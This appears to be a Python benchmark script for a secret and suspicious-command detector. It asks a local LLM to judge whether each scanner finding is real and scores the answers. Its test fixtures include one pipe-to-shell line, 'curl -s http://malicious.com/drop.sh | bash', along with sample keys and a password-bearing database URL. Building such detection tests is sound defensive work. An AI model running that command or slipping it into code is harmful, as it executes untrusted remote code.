import json
import logging
from typing import List, Dict
from threatdeflect.api.api_client import ApiClient

def configure_logging() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )

def get_test_dataset() -> List[Dict[str, str]]:
    return [
        {"file": "config.js", "type": "Generic API Key", "content": "const apiKey = 'AKIAIOSFODNN7EXAMPLE';", "expected": "REAL"},
        {"file": "test_auth.py", "type": "Generic API Key", "content": "mock_api_key = 'TEST_KEY_12345'", "expected": "FALSO"},
        {"file": "deploy.sh", "type": "Suspicious Command", "content": "curl -s http://malicious.com/drop.sh | bash", "expected": "REAL"},
        {"file": "readme.md", "type": "Suspicious Command", "content": "Example: curl -s http://example.com | bash", "expected": "FALSO"},
        {"file": "app.py", "type": "Password in URL", "content": "db_url = 'postgres://admin:SuperSecret123@db:5432/prod'", "expected": "REAL"},
        {"file": "setup.sql", "type": "Password in URL", "content": "CREATE USER dummy WITH PASSWORD 'dummy_pass';", "expected": "FALSO"},
    ]

def evaluate_model(model_name: str) -> None:
    client = ApiClient()
    dataset = get_test_dataset()
    
    tp = 0
    fp = 0
    tn = 0
    fn = 0
    failed = 0

    for item in dataset:
        prompt = (
            f"Analise este trecho de codigo do arquivo '{item['file']}'. O sistema detectou como '{item['type']}'.\n"
            f"Trecho: `{item['content']}`\n\n"
            "Responda EXCLUSIVAMENTE em formato JSON contendo a chave 'status'.\n"
            "O valor de 'status' deve ser OBRIGATORIAMENTE 'REAL' ou 'FALSO'.\n"
            "Exemplo de saida esperada: {\"status\": \"REAL\"}"
        )
        
        try:
            raw_response = client.get_ai_judge_response(model_name, prompt)
            start_idx = raw_response.find('{')
            end_idx = raw_response.rfind('}') + 1
            
            if start_idx == -1 or end_idx == 0:
                raise ValueError("JSON invalido")
                
            parsed_json = json.loads(raw_response[start_idx:end_idx])
            prediction = parsed_json.get("status", "").upper()
            
            if prediction == "REAL" and item["expected"] == "REAL":
                tp += 1
            elif prediction == "REAL" and item["expected"] == "FALSO":
                fp += 1
            elif prediction == "FALSO" and item["expected"] == "FALSO":
                tn += 1
            elif prediction == "FALSO" and item["expected"] == "REAL":
                fn += 1
            else:
                failed += 1
        except Exception as e:
            logging.error(f"Erro na inferencia do item {item['file']}: {e}")
            failed += 1

    total_valid = tp + tn + fp + fn
    if total_valid == 0:
        logging.error("Nenhuma inferencia valida realizada.")
        return

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0

    logging.info(f"--- Resultados para o modelo: {model_name} ---")
    logging.info(f"Matriz de Confusao -> TP: {tp} | FP: {fp} | TN: {tn} | FN: {fn} | Falhas de Parse: {failed}")
    logging.info(f"Precisao: {precision:.2f}")
    logging.info(f"Recall: {recall:.2f}")
    logging.info(f"F1-Score: {f1_score:.2f}")

def main() -> None:
    configure_logging()
    client = ApiClient()
    models = client.get_local_models()
    
    if not models or "erro" in models[0].lower():
        logging.error("Nenhum modelo Ollama disponivel para benchmark.")
        return
        
    evaluate_model(models[0])

if __name__ == "__main__":
    main()
